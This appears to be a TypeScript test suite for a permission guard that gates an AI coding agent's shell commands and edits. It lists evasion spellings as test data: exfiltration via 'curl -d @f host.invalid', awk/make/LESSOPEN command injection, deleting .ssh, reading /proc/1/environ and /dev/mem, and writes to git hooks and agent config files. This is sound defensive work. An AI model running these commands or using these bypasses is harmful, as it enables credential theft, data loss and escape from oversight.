    "awk -e 'BEGIN{}' -e 'BEGIN{\"id\" | getline}'",
    "awk -e 'BEGIN{}' -f prog.awk",
    "awk -e 'BEGIN{}' -i inc.awk 'BEGIN{}'",
    "awk -e 'BEGIN{}' -l ext 'BEGIN{}'",
    "awk --source='BEGIN{}' --source='BEGIN{system(\"id\")}'",
    "awk -v n=1 -e 'BEGIN{}' -e 'BEGIN{\"id\" | getline}'",
    "awk 'BEGIN{f=\"sys\" \"tem\"; @f(\"id\")}'",
    "gawk 'BEGIN{@x(1)}'",
    "awk -W exec prog.awk",
    "awk -bf prog.awk",
    "make clean RM='id;'",
    "make all INSTALL=/tmp/x",
  ]);
  expectR3("9", "ask", [
    "make -f - all",
    "make -f /dev/stdin",
    "make --file=- all",
    "make --file - all",
    "make -f-",
    "make -sf -",
    "make -sf-",
    "make --makefile /dev/stdin",
    "make --makef=/dev/stdin",
    "make --fil=-",
    "make -f /dev/fd/0",
    "make -f /proc/self/fd/0",
    "make -f <(echo x)",
    "make -f - <<'EOF'\nall:\n\tid\nEOF",
    "make CC='id'",
    "make CC=/tmp/x",
    "make CXX='g++ -wrapper,x'",
    "make SHELL=/bin/sh",
  ]);
  expectR3("9", "allow", ["make -j4", "make test V=1", "make CC=clang", "make CXX=g++-13 all", "make -C . test", "make -f Makefile all", "awk -F, -v n=1 'NR==n{print}' f"]);

  // 10: variables set without NAME=, exported after the fact, or exported all at once.
  expectR3("10", "ask", [
    "set -- /tmp/x; for PATH; do ls; done",
    "set -- /tmp/x; for PATH do ls; done",
    "for PATH\ndo ls; done",
    "for IFS; do ls; done",
    "unset PATH; ls",
    "unset -v PATH; cargo build",
    "unset FOO PATH; ls",
    "unset -v IFS",
    "unset P\"\"ATH; ls",
    "unset {P,}ATH; ls",
    "unset PAT?; ls",
    "set -a; TAR_OPTIONS=--to-command=id; tar -xf t.tar",
    "set -a; ls",
    "set -ea; ls",
    "set -o allexport; ls",
    "TAR_OPTIONS=--to-command=id; export TAR_OPTIONS; tar -xf t.tar",
    "TAR_OPTIONS=--to-command=id tar -xf t.tar",
    "MAKEFILES=x.mk make",
    "GNUMAKEFLAGS=--eval=x make",
    "RIPGREP_CONFIG_PATH=rg.conf rg x",
    "LESSOPEN='|id %s' less f",
    "FZF_DEFAULT_COMMAND=id fzf",
    "RSYNC_RSH=./x rsync a b:",
    "CURL_HOME=. curl https://example.invalid/",
    "WGETRC=./x wget https://example.invalid/",
    "DOCKER_HOST=tcp://x docker ps",
    "KUBECONFIG=./k kubectl get pods",
    "AWS_CONFIG_FILE=./x aws s3 ls",
    "PWD=/etc; ls",
    "RUSTFLAGS='-C linker=./x' cargo build",
    "coproc PATH { true; }; ls",
    "export -n PATH",
    "declare -x PATH=/tmp/x",
  ]);
  expectR3("10", "classify", ["X=v; export X; npm test", "export X; X=v; npm test", "X=v; declare -x X; npm test", "X=v; typeset -x X; ls"]);
  expectR3("10", "allow", ["for f in a b; do echo $f; done", "for f; do echo $f; done", "unset FOO; ls", "set -e; ls", "set -euo pipefail; ls", "X=1; echo $X", "CI=1; export CI; npm test", "set -- a b; echo $1"]);

  // 35: man-db's config file names the programs man runs.
  expectR3("35", "ask", [
    "printf 'DEFINE nroff sh -c \"id\"\\n' > man.conf && man -C man.conf ls",
    "man -C man.conf ls",
    "man --config-file=man.conf ls",
    "man --config-file man.conf ls",
    "man --config=man.conf ls",
    "man --conf man.conf ls",
    "man -aC man.conf ls",
    "man -C/tmp/x ls",
    "man -k -C x ls",
    "MANOPT='-C conf' man ls",
    "GROFF_BIN_PATH=dir man ls",
    "MANROFFOPT=-U man ls",
    "MANPAGER=id man ls",
    "MAN_DISABLE_SECCOMP=1 man ls",
    "man -P id ls",
    "man -H ls",
  ]);
  expectR3("35", "allow", ["man ls", "man 2 open", "man -k printf", "man -f ls", "man -a ls", "man -Tutf8 ls", "man -p t ls", "man -l r3c.txt"]);

  // 22: destructive git in spellings the rules do not key on.
  expectR3("22", "ask", [
    "git checkout -qf HEAD",
    "git checkout -fq main",
    "git checkout HEAD ./",
    "git checkout HEAD r3c.txt",
    "git checkout main r3c.txt scripts",
    "git checkout ./",
    "git checkout r3c.txt",
    "git checkout scripts",
    "git checkout '*.txt'",
    "git checkout :/r3c.txt",
    "git checkout --ours r3c.txt",
    "git checkout --pathspec-from-file=list",
    "git checkout --no-overlay main",
    "git checkout -B feature/x HEAD~1",
    "git switch --discard-changes main",
    "git switch --disc main",
    "git switch -f main",
    "git switch -qf main",
    "git switch --force main",
    "git switch -C topic",
    "git switch --force-create topic",
    "git branch -df topic",
    "git branch -fd topic",
    "git branch -qD topic",
    "git branch -f main HEAD~1",
    "git branch -qM a b",
    "git branch --delete -f topic",
    "git tag -fd v1",
    "git gc --prune=yesterday",
    "git gc --prune=all",
  ]);
  expectR3("22", "allow", ["git checkout main", "git checkout -b r3-new", "git checkout feature/x", "git checkout -", "git switch main", "git branch -d merged", "git branch r3-new", "git log --oneline", "git restore --staged r3c.txt", "git stash", "git stash pop", "git tag v1", "git gc", "git clean -n"]);

  // 23: a write the check cannot place, then a file run by its path.
  expectR3("23", "classify", [
    "cd scripts && echo 'id' >> build.sh && ./build.sh",
    "cd scripts && echo 'id' >> build.sh; ./build.sh",
    "cd scripts; printf 'id' > x.sh; sh x.sh",
    "cd scripts && sed -i 's/build/id/' build.sh && cd .. && ./scripts/build.sh",
    "sort -o scripts/build.sh /tmp/p; ./scripts/build.sh",
    "cp -t scripts /tmp/build.sh; ./scripts/build.sh",
    "cp --target-directory=scripts /tmp/build.sh; ./scripts/build.sh",
    "patch < x.diff; ./scripts/build.sh",
    "patch -p1 -i x.diff; ./scripts/build.sh",
    "git apply x.diff; ./scripts/build.sh",
    "tar -xf t.tar; ./scripts/build.sh",
    "tar xf t.tar && bash scripts/build.sh",
    "cp -r /tmp/evil/scripts .; ./scripts/build.sh",
    "git stash pop && ./scripts/build.sh",
    "echo id >| scripts/build.sh; ./scripts/build.sh",
    "echo id &> scripts/build.sh; ./scripts/build.sh",
    "sed -i.bak 's/a/b/' scripts/build.sh; ./scripts/build.sh",
    "sed -Ei 's/a/b/' scripts/build.sh && ./scripts/build.sh",
    "sed --in-place=.bak 's/a/b/' scripts/build.sh && ./scripts/build.sh",
  ]);
  // A write after a cd the check cannot follow: the rules themselves ask, which is stricter.
  expectR3("23", "ask", ["cd \"$d\" && echo id >> b.sh && ./b.sh"]);
  // A cd the rules do not follow (behind a keyword, a wrapper or eval): they judge relative
  // paths against the wrong directory.
  expectR3("23", "ask", ["if true; then cd ~; fi; rm -rf .ssh", "builtin cd ~; rm -rf .ssh", "eval cd ~; rm -rf .ssh", "{ cd ~; }; rm -rf .ssh", "command cd ~ && rm -rf .ssh"]);
  expectR3("23", "allow", ["./scripts/build.sh", "cd scripts && ./build.sh", "cd scripts && ls && cat build.sh", "tar -xzf out.tar.gz -C build", "git checkout main && npm test", "echo x > notes.txt; ./scripts/build.sh", "cd scripts && cd .. && ls"]);
  test("r3 23: an append after cd makes the script the session's for later calls", async () => {
    const s = new SessionState(repo);
    assert.equal(kind(await decideShell(guard, s, repo, "cd scripts && echo 'id' >> build.sh")), "allow");
    assert.equal(kind(await decideShell(guard, s, repo, "./scripts/build.sh")), "classify");
  });

  // 24: a write target named through braces or a glob.
  expectR3("24", "ask", [
    "mkdir -p sub/{.git,x}",
    "cp cfg sub/.g[i]t/config",
    "echo '{}' | tee opencode.jso{n,n}",
    "echo x > sub/.gi?/config",
    "echo x > sub/.g*t/config",
    "touch .clau[d]e/settings.json",
    "mkdir -p {.husky,x}",
    "cp x .pre-commit-config.y?ml",
    "cp x {AGENTS,README}.md",
  ]);
  expectR3("24", "allow", ["mkdir -p src/{a,b}", "cp r3c.txt{,.bak}", "touch src/*.ts", "echo x > notes.txt"]);

  // 25: git options whose value is a file git writes.
  expectR3("25", "ask", [
    "git log -1 --format=x --output=/opt/automode-r3/bashrc",
    "git log -1 --output /opt/automode-r3/bashrc",
    "git show --out=/opt/automode-r3/x",
    "git diff --output=/opt/automode-r3/x",
    "git format-patch -o /opt/automode-r3 HEAD~1",
    "git format-patch --output-directory=/opt/automode-r3 HEAD~1",
    "git format-patch --output-dir /opt/automode-r3 HEAD~1",
    "git archive -o /opt/automode-r3/x.tar HEAD",
    "git archive --output=/opt/automode-r3/x.tar HEAD",
    "git bundle create /opt/automode-r3/x.bundle HEAD",
    "git log --output=.git/hooks/pre-commit",
    "git diff --output=opencode.json",
  ]);
  expectR3("25", "allow", ["git diff --output=out.diff", "git format-patch -o patches HEAD~1", "git log -1 --format=%H"]);

  // 28: the environment asks only where it changes what runs (signed off).
  expectR3("28", "allow", [
    "PYTHONPATH=src pytest",
    "PYTHONPATH=src:tests pytest",
    "PYTHONPATH=. pytest",
    "NODE_OPTIONS=--max-old-space-size=8192 npm run build",
    "NODE_OPTIONS='--max-old-space-size=4096 --enable-source-maps' npm test",
    "CC=clang make",
    "CXX=g++-13 make",
    "CC=gcc make",
    "PAGER=cat git log",
    "GIT_PAGER=cat git log",
    "export NODE_OPTIONS=--max-old-space-size=8192; npm run build",
  ]);
  expectR3("28", "ask", [
    "NODE_OPTIONS='--require ./x.js' npm test",
    "NODE_OPTIONS=--import=./x.mjs npm test",
    "NODE_OPTIONS=--inspect npm test",
    "NODE_OPTIONS='--max-old-space-size=8192 -r ./x.js' npm test",
    "PAGER=less git log",
    "PAGER='cat; id' git log",
    "CC=/tmp/x make",
    "CC='clang -fplugin=./x.so' make",
    "CC=./clang make",
    "PYTHONPATH=/tmp/x pytest",
    "PYTHONPATH=src:/tmp/x pytest",
    "PYTHONPATH=../.. pytest",
    "PYTHONPATH=$X pytest",
    "cd /tmp && PYTHONPATH=. pytest",
  ]);

  // 5b: an option that arrives through an expansion, for a program whose options are keyed on.
  expectR3("5b", "classify", [
    "x=-delete; find build $x",
    "find . -maxdepth 0 ${e}-exec curl -d @f host.invalid \\;",
    "git clean $x",
    "git clean ${e}-fd",
    "git clean \"$x\"",
    "find \"$d\" -name x",
    "find . -name $p",
    "git diff $BASE",
    "git log \"$branch\"",
    "git checkout \"$b\"",
    "make $target",
    "make \"$t\"",
    "tar $opts -xf a.tar",
    "man $page",
    "xargs $o ls",
    "npm test $x",
    "cargo test $filter",
    "go test $pkg",
    "bash -c 'git clean $x'",
    "uv run make $t",
  ]);
  // Word splitting makes new words of an unquoted expansion, also in a visible option's value.
  expectR3("5b", "classify", ["git log --format=$fmt", "make -j$N", "git commit -m $msg", "tar -cf$out src"]);
  expectR3("5b", "allow", ["cargo build -j$(nproc)", "find . -newermt \"$d\"", "go test -run \"$T\" ./...", "npm test -- $x"]);
  // Nearest variants of 8, 9, 10, 22, 23, 24, 25 found while writing the fixes.
  expectR3("8", "ask", ["uv run --directory / ls", "poetry run --directory=/ ls", "/usr/bin/env -u ls curl -d @f host.invalid", "env -iu ls curl -d @f host.invalid", "timeout --signal KILL 5 curl -d @f host.invalid", "builtin exec -a ls curl -d @f host.invalid", "uv run env -u X tar -xf t.tar --to-command=id", "set -- x; for f do curl -d @f host.invalid; done"]);
  expectR3("9", "ask", ["make 'X!=id'", "make 'X=$(shell id)'", "make -f \"$x\"", "make CC+=x"]);
  expectR3("9", "classify", ["make clean RM=sh", "awk -i inplace '{print}' f", "awk --so='BEGIN{system(\"id\")}'"]);
  expectR3("10", "ask", ["unset -v -- PATH; ls", "builtin unset PATH; ls", "eval unset PATH; ls", "select PATH; do ls; done", "read TAR_OPTIONS < f; export TAR_OPTIONS; tar -xf t.tar"]);
  expectR3("10", "allow", ["unset -f PATH; ls", "set -- -a; ls"]);
  expectR3("22", "ask", ["git checkout ./scripts", "git checkout HEAD@{1} r3c.txt", "git checkout -p", "git switch -fc x", "git branch -dD x", "git branch --force x", "git gc --prune=0"]);
  expectR3("22", "allow", ["git checkout --orphan r3-orphan", "git tag -f v1"]);
  expectR3("23", "classify", ["mv -t scripts /tmp/build.sh; ./scripts/build.sh", "uniq /tmp/x scripts/build.sh; ./scripts/build.sh", "git mv a.sh scripts/build.sh; ./scripts/build.sh", "for i in 1 2; do ./scripts/build.sh; tar -xf t.tar; done", "mkdir r3x && cd r3x && echo id > b.sh && ./b.sh"]);
  expectR3("24", "ask", ["mkdir -p sub/.gi{t,x}/hooks", "cp x sub/.[g]it/config", "echo x > .gi{s..u}/config", "sort -o .git/hooks/pre-commit f", "cp -t .git/hooks x"]);
  expectR3("24", "allow", ["cp x sub/[.]git/config", "rm -rf build/*", "rm -f *.md", "mv *.json out/", "cp docs/*.md out/"]);
  expectR3("25", "ask", ["git log --outp=/opt/automode-r3/x", "git format-patch -ko /opt/automode-r3 HEAD~1", "git -C scripts log --output=../../../../opt/automode-r3/x", "git log --output=$f"]);
  expectR3("28", "allow", ["PYTHONPATH=src:$PYTHONPATH pytest", "NODE_OPTIONS=\"$NODE_OPTIONS --max-old-space-size=8192\" npm test", "env NODE_OPTIONS=--max-old-space-size=8192 npm test", "make CC=clang CXX=clang++", "cd scripts && PYTHONPATH=. pytest"]);
  expectR3("28", "ask", ["NODE_OPTIONS=--max-old-space-size=8192 NODE_OPTIONS=--require=x npm test", "CC=ccache make", "PYTHONPATH=src/../.. pytest", "GIT_PAGER=cat GIT_DIR=x git log"]);
  expectR3("5b", "allow", [
    "ls $dir",
    "echo $x",
    "git commit -m \"$msg\"",
    "git commit -m \"$(cat <<'EOF'\nfix: a thing\nEOF\n)\"",
    "make -j$(nproc)",
    "git log --since=\"$since\"",
    "find . -name \"*.$ext\"",
    "git log -1 -- \"$f\"",
    "npm test -- \"$x\"",
    "git -C \"$PWD\" status",
  ]);
});

// Round 3, finding 24: an archive's names are unknown before it runs, so the layout check is the
// control. A real extraction that drops each name a shell write of it would ask about pauses the
// session at the next decision.
describe("r3 24: an extraction that drops a protected name pauses the session", () => {
  const names = [
    "opencode.json", "opencode.jsonc", ".opencode/plugin/x.js", ".claude/settings.json", ".agents/x.md", "AGENTS.md", "CLAUDE.md",
    "sub/.git/config", ".husky/pre-commit", ".lefthook/pre-commit/x.sh", "lefthook.yml", ".lefthook.yaml", ".pre-commit-config.yaml", ".overcommit.yml",
  ];
  for (const name of names) {
    test(`r3 24: tar -x of ${name} pauses`, async () => {
      const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-24-")));
      execFileSync("git", ["init", "-q", dir]);
      const src = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "r3-24-src-")));
      fs.mkdirSync(path.dirname(path.join(src, name)), { recursive: true });
      fs.writeFileSync(path.join(src, name), "x\n");
      execFileSync("tar", ["-cf", path.join(src, "..", `${path.basename(src)}.tar`), "-C", src, name]);
      const s = new SessionState(dir);
      // The plugin makes .opencode at session start (index.ts); do the same here.
      fs.mkdirSync(path.join(dir, ".opencode"), { recursive: true });
      assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
      execFileSync("tar", ["-xf", path.join(src, "..", `${path.basename(src)}.tar`)], { cwd: dir });
      const d = await decideShell(guard, s, dir, "ls");
      assert.match(d.reason, /paused/, `${name}: ${d.effect} by ${d.by}: ${d.reason}`);
    });
  }
});

// ---- round 3, group D ----

// A fresh checkout of its own for each test.
const freshProject = (prefix: string) => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, prefix)));
  execFileSync("git", ["init", "-q", dir]);
  return dir;
};
// Discovery limited to a few entries per root, as a checkout over the budget is.
async function overBudget<T>(fn: () => T | Promise<T>): Promise<T> {
  const before = { ...sandbox.limits };
  sandbox.limits.entries = 3;
  try {
    return await fn();
  } finally {
    Object.assign(sandbox.limits, before);
  }
}
const filler = (dir: string) => {
  for (let i = 0; i < 6; i++) fs.writeFileSync(path.join(dir, `f${i}.txt`), "x\n");
};

// Round 3, finding 11: what discovery could not see binds the edit tool and the layout check as it
// binds the sandbox's plan.
describe("r3 11: a discovery problem makes an edit ask, as it makes a shell command ask", () => {
  const edit = (dir: string, rel: string) => decideFile(guard, new SessionState(dir), dir, path.join(dir, rel));
  test("r3 11: core.hooksPath behind a symbolic link (link -> tools): an edit of tools/hooks/pre-commit asks", () => {
    const dir = freshProject("r3-11a-");
    fs.mkdirSync(path.join(dir, "tools", "hooks"), { recursive: true });
    fs.symlinkSync("tools", path.join(dir, "link"));
    execFileSync("git", ["-C", dir, "config", "core.hooksPath", "link/hooks"]);
    const d = edit(dir, "tools/hooks/pre-commit");
    assert.equal(d?.effect, "ask", JSON.stringify(d));
    assert.match(d!.reason, /symbolic link/);
  });
  test("r3 11: a checkout over the scan budget with core.hooksPath=.githooks: an edit of .githooks/pre-commit asks", async () => {
    const dir = freshProject("r3-11b-");
    filler(dir);
    execFileSync("git", ["-C", dir, "config", "core.hooksPath", ".githooks"]);
    const d = await overBudget(() => edit(dir, ".githooks/pre-commit"));
    assert.equal(d?.effect, "ask", JSON.stringify(d));
    assert.match(d!.reason, /stopped/);
  });
  test("r3 11: a bare repository the stopped walk missed: an edit of vendor/r.git/hooks/pre-commit asks", async () => {
    const dir = freshProject("r3-11c-");
    filler(dir);
    execFileSync("git", ["init", "-q", "--bare", path.join(dir, "vendor", "r.git")]);
    const d = await overBudget(() => edit(dir, "vendor/r.git/hooks/pre-commit"));
    assert.equal(d?.effect, "ask", JSON.stringify(d));
  });
  test("r3 11: a shell command asks when the layout check cannot see the whole project, before any plan is made", async () => {
    const dir = freshProject("r3-11d-");
    filler(dir);
    const d = await overBudget(() => decideShell(guard, new SessionState(dir), dir, "ls"));
    assert.equal(d.effect, "ask", d.reason);
    assert.match(d.reason, /stopped/);
  });
  test("r3 11: a command the rules ask about keeps its own reason", async () => {
    const dir = freshProject("r3-11e-");
    filler(dir);
    const d = await overBudget(() => decideShell(guard, new SessionState(dir), dir, "sudo ls"));
    assert.equal(d.effect, "ask");
    assert.doesNotMatch(d.reason, /stopped/);
  });
  test("r3 26: someone else's unlistable directory holding a bare repository: an edit of its hook asks, and so does a shell write", async () => {
    const dir = freshProject("r3-26-");
    const shared = path.join(dir, "shared");
    execFileSync("git", ["init", "-q", "--bare", path.join(shared, "r.git")]);
    fs.chmodSync(shared, 0o300);
    // No second user here: getuid answers another uid, so this user's directory stands in.
    const real = process.getuid;
    const other = process.getuid!() + 4242;
    process.getuid = () => other;
    try {
      assert.equal(edit(dir, "shared/r.git/hooks/pre-receive")?.effect, "ask");
      const d = await decideShell(guard, new SessionState(dir), dir, "printf x > shared/r.git/hooks/pre-receive");
      assert.equal(d.effect, "ask", d.reason);
    } finally {
      process.getuid = real;
      fs.chmodSync(shared, 0o700);
    }
  });
  test("r3 11: an ordinary edit and an ordinary command in an ordinary checkout are unchanged", async () => {
    const dir = freshProject("r3-11f-");
    filler(dir);
    assert.equal(edit(dir, "src/main.ts"), undefined);
    assert.equal(edit(dir, "f1.txt"), undefined);
    assert.equal((await decideShell(guard, new SessionState(dir), dir, "ls")).effect, "allow");
  });
});

// Round 3, finding 40: one decision walks each root once. The walk is shared between the git
// snapshot, the layout check, the decision and the plan of one call, and never kept for the next.
describe("r3 40: one decision walks each root once", () => {
  const counted = async (fn: () => unknown) => {
    sandbox.walkCount.clear();
    await fn();
    return Object.fromEntries(sandbox.walkCount);
  };
  const planOf = (s: SessionState, dir: string, scan?: sandbox.Scan) =>
    sandbox.plan({ projectRoots: projectRoots(s), allowedPaths: [], cacheDirs: [], gitWritable: false, exposeSsh: false, keepSockets: [], showPaths: [], hidePaths: [], project: dir }, scan);
  test("r3 40: an allowed shell command, decided and planned, on a session's first call", async () => {
    const dir = freshProject("r3-40a-");
    const s = new SessionState(dir);
    const scan = new sandbox.Scan();
    const counts = await counted(async () => {
      const d = await decideShell(guard, s, dir, "ls", undefined, scan);
      assert.equal(d.effect, "allow", d.reason);
      assert.equal(planOf(s, dir, scan).problem, undefined);
    });
    assert.equal(counts[dir], 1, JSON.stringify(counts));
    assert.equal(counts[fs.realpathSync(os.tmpdir())], 1, JSON.stringify(counts));
    assert.equal(counts["/run"], 1, JSON.stringify(counts));
    for (const [root, n] of Object.entries(counts)) assert.equal(n, 1, `${root} walked ${n} times`);
  });
  test("r3 40: a later call walks again: nothing is kept from one decision to the next", async () => {
    const dir = freshProject("r3-40b-");
    const s = new SessionState(dir);
    await decideShell(guard, s, dir, "ls", undefined, new sandbox.Scan());
    const scan = new sandbox.Scan();
    const counts = await counted(async () => {
      await decideShell(guard, s, dir, "ls", undefined, scan);
      planOf(s, dir, scan);
    });
    for (const [root, n] of Object.entries(counts)) assert.equal(n, 1, `${root} walked ${n} times`);
    assert.equal(counts[dir], 1);
    // A repository made after that decision is seen by the next one.
    execFileSync("git", ["init", "-q", "--bare", path.join(dir, "late.git")]);
    assert.match((await decideShell(guard, s, dir, "ls", undefined, new sandbox.Scan())).reason, /paused.*late\.git/);
  });
  test("r3 40: an edit walks the project once, on a session's first call", async () => {
    const dir = freshProject("r3-40c-");
    const counts = await counted(() => assert.equal(decideFile(guard, new SessionState(dir), dir, path.join(dir, "a.ts")), undefined));
    assert.deepEqual(counts, { [dir]: 1 });
  });
});

// Round 3, finding 12: a read-only remote command prints nothing a value chosen for it can turn
// into a secret. `ps` output formats are held to field names that print no environment, raw reads
// of devices and of /proc beyond a list of harmless files ask, and every other option that takes a
// value was reviewed (decide.ts, the REMOTE table).
describe("r3 12: remote options that take a value", () => {
  expectEffect("ask", [
    "ssh lab 'ps -e -o environ='",
    "ssh lab 'sudo ps -e -o environ='",
    "ssh lab 'ps -o pid,environ'",
    "ssh lab 'ps -o pid= -o environ='",
    "ssh lab 'ps -o pid=X -o environ'",
    "ssh lab 'ps -o pid=X,environ'", // procps 4: two columns
    "ssh lab 'ps -o \"pid=a b,environ\"'",
    "ssh lab 'ps -oenviron'",
    "ssh lab 'ps -eo pid,environ'",
    "ssh lab 'ps -eoenviron'",
    "ssh lab 'ps -O environ'",
    "ssh lab 'ps --format environ'",
    "ssh lab 'ps --format=pid,environ'",
    "ssh lab 'ps axo pid,environ'",
    "ssh lab 'ps o environ'",
    "ssh lab 'ps e'",
    "ssh lab 'ps eww'",
    "ssh lab 'ps auxe'",
    "ssh lab 'ps aux e'",
    "ssh lab 'ps -e --sort environ'",
    "ssh lab 'ps -o \"%p %a\"'",
    "ssh lab 'ps -o pid -o'",
    // Raw reads that print what the rules cannot see by name.
    "ssh lab 'sudo head -c 1000 /proc/kcore'",
    "ssh lab 'sudo cat /dev/sda'",
    "ssh lab 'sudo cat /dev/mem'",
    "ssh lab 'sudo tail -c 100 /proc/1/mem'",
    "ssh lab 'sudo grep -a PASS /proc/1/environ'",
    "ssh lab 'sudo cat /proc/self/../1/environ'",
    "ssh lab 'cat /proc//1/environ'",
    "ssh lab 'sort /dev/sda1'",
    "ssh lab 'sudo cat /proc/net/../1/environ'",
    "ssh lab 'cat ../../dev/sda'",
    // Output formats are names from a list.
    "ssh lab 'journalctl -o \"x y\"'",
    "ssh lab 'systemctl status nginx -o nosuchformat'",
    // Unchanged asks: options that read another file or reach another host.
    "ssh lab 'journalctl --file /tmp/x'",
    "ssh lab 'journalctl -D /tmp/x'",
    "ssh lab 'systemctl -H other status'",
    "ssh lab 'systemctl -M other status'",
    "ssh lab 'find / -fprintf /tmp/x %p'",
  ]);
  expectEffect("allow", [
    "ssh lab 'ps aux'",
    "ssh lab 'ps -ef'",
    "ssh lab 'ps -o pid,cmd'",
    "ssh lab 'ps -eo pid,user,%cpu,%mem,etime,args --sort=-%cpu'",
    "ssh lab 'ps -o pid= -o comm='",
    "ssh lab 'ps -o pid=PID,comm=Command'",
    "ssh lab 'ps axo pid,ppid,stat,cmd'",
    "ssh lab 'ps -p 1 -o comm='",
    "ssh lab 'ps -C nginx -o pid,rss'",
    "ssh lab 'sudo ps -eo pid,args'",
    "ssh lab 'ps auxww'",
    "ssh lab 'cat /proc/meminfo'",
    "ssh lab 'cat /proc/loadavg'",
    "ssh lab 'cat /proc/1/status'",
    "ssh lab 'cat /dev/null'",
    "ssh lab 'md5sum /dev/null'",
    "ssh lab 'tail -n 5 /var/log/syslog'",
    "ssh lab 'grep dev /etc/fstab'",
    "ssh lab 'ls -l /dev/disk/by-uuid'",
    "ssh lab 'lsblk -o NAME,SIZE /dev/sda'",
    "ssh lab 'journalctl -o json -n 5'",
    "ssh lab 'journalctl -u nginx --output=short-iso'",
    "ssh lab 'systemctl status nginx --no-pager -o cat'",
    "ssh lab 'df --output=source,target'",
    "ssh lab 'stat -c %n /etc/passwd'",
    "ssh lab 'column -o x /etc/hosts'",
  ]);
});

describe("r3 33: git operation state after a git-only call", () => {
  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t", GIT_EDITOR: "true" };
  const g = (dir: string, ...args: string[]) => execFileSync("git", ["-C", dir, ...args], { encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] });
  // Status is not checked: a conflict stop exits non-zero, which is the point.
  const tryGit = (dir: string, ...args: string[]) => {
    try {
      g(dir, ...args);
    } catch {
      // stopped on a conflict
    }
  };
  // A repository with `main` and `side` changing the same line of `f`, `main` checked out.
  const conflicted = () => {
    const dir = fs.realpathSync(fs.mkdtempSync(path.join(tmp, "state-")));
    g(dir, "init", "-q", "-b", "main");
    fs.writeFileSync(path.join(dir, "f"), "a\n");
    g(dir, "add", "f");
    g(dir, "commit", "-qm", "a");
    g(dir, "checkout", "-qb", "side");
    fs.writeFileSync(path.join(dir, "f"), "side\n");
    g(dir, "commit", "-qam", "side");
    fs.writeFileSync(path.join(dir, "g"), "g\n");
    g(dir, "add", "g");
    g(dir, "commit", "-qm", "g");
    g(dir, "checkout", "-q", "main");
    fs.writeFileSync(path.join(dir, "f"), "main\n");
    g(dir, "commit", "-qam", "main");
    return dir;
  };
  // A session whose snapshot is taken, then a git-only call that runs `effect` and is over.
  const after = async (dir: string, command: string, effect: () => void) => {
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    const call = noteGitCall(s, command);
    assert.ok(call, `${command} is a git-only call`);
    effect();
    call.done = true;
    return decideShell(guard, s, dir, "ls");
  };
  const paused = (d: Decision, what: RegExp) => {
    assert.equal(d.effect, "ask", d.reason);
    assert.match(d.reason, /paused/);
    assert.match(d.reason, what);
  };

  for (const [name, make] of [
    ["rebase-merge/", (gd: string) => (fs.mkdirSync(path.join(gd, "rebase-merge")), fs.writeFileSync(path.join(gd, "rebase-merge", "git-rebase-todo"), "pick 0000000 x\n"))],
    ["rebase-apply/", (gd: string) => fs.mkdirSync(path.join(gd, "rebase-apply"))],
    ["MERGE_HEAD", (gd: string) => fs.writeFileSync(path.join(gd, "MERGE_HEAD"), "0".repeat(40) + "\n")],
    ["MERGE_MSG", (gd: string) => fs.writeFileSync(path.join(gd, "MERGE_MSG"), "x\n")],
    ["CHERRY_PICK_HEAD", (gd: string) => fs.writeFileSync(path.join(gd, "CHERRY_PICK_HEAD"), "0".repeat(40) + "\n")],
    ["REVERT_HEAD", (gd: string) => fs.writeFileSync(path.join(gd, "REVERT_HEAD"), "0".repeat(40) + "\n")],
    ["sequencer/", (gd: string) => fs.mkdirSync(path.join(gd, "sequencer"))],
    ["BISECT_LOG", (gd: string) => fs.writeFileSync(path.join(gd, "BISECT_LOG"), "")],
    ["AUTO_MERGE", (gd: string) => fs.writeFileSync(path.join(gd, "AUTO_MERGE"), "0".repeat(40) + "\n")],
  ] as const) {
    test(`r3 33: ${name} appearing during a git-only call that does not explain it pauses the session`, async () => {
      const dir = conflicted();
      paused(await after(dir, "git add f && git commit -m x", () => make(path.join(dir, ".git"))), new RegExp(name.replace("/", "")));
    });
  }

  test("r3 33: state appearing in a linked worktree's git directory pauses too", async () => {
    const dir = conflicted();
    const wt = path.join(path.dirname(dir), path.basename(dir) + "-wt");
    g(dir, "worktree", "add", "-q", wt, "side");
    const name = fs.readdirSync(path.join(dir, ".git", "worktrees"))[0];
    paused(await after(dir, "git status", () => fs.mkdirSync(path.join(dir, ".git", "worktrees", name, "rebase-merge"))), /worktrees.*rebase-merge/);
  });

  test("r3 33: the matching subcommand explains its own state", async () => {
    for (const [command, names] of [
      ["git merge side", ["MERGE_HEAD", "MERGE_MSG", "MERGE_MODE", "AUTO_MERGE"]],
      ["git cherry-pick side", ["CHERRY_PICK_HEAD", "MERGE_MSG", "sequencer"]],
      ["git revert HEAD", ["REVERT_HEAD", "MERGE_MSG", "sequencer"]],
      ["git rebase main", ["rebase-merge", "REBASE_HEAD", "MERGE_MSG"]],
      ["git pull", ["MERGE_HEAD", "rebase-merge"]],
      ["git bisect start", ["BISECT_START", "BISECT_LOG", "BISECT_TERMS"]],
      ["git stash pop", ["AUTO_MERGE"]],
    ] as const) {
      const dir = conflicted();
      const d = await after(dir, command, () => {
        for (const n of names) {
          const p = path.join(dir, ".git", n);
          if (/^[a-z]/.test(n)) fs.mkdirSync(p);
          else fs.writeFileSync(p, "x\n");
        }
      });
      assert.equal(d.effect, "allow", `${command}: ${d.reason}`);
    }
  });

  test("r3 33: git stash pop does not explain a rebase, nor git merge a cherry-pick", async () => {
    const dir = conflicted();
    paused(await after(dir, "git stash pop", () => fs.mkdirSync(path.join(dir, ".git", "rebase-merge"))), /rebase-merge/);
    const other = conflicted();
    paused(await after(other, "git merge side", () => fs.writeFileSync(path.join(other, ".git", "CHERRY_PICK_HEAD"), "x\n")), /CHERRY_PICK_HEAD/);
  });

  test("r3 33: state that was there before the call is not new", async () => {
    const dir = conflicted();
    tryGit(dir, "merge", "side");
    assert.ok(fs.existsSync(path.join(dir, ".git", "MERGE_HEAD")));
    assert.equal((await after(dir, "git status", () => fs.writeFileSync(path.join(dir, ".git", "MERGE_MSG"), "changed\n"))).effect, "allow");
  });

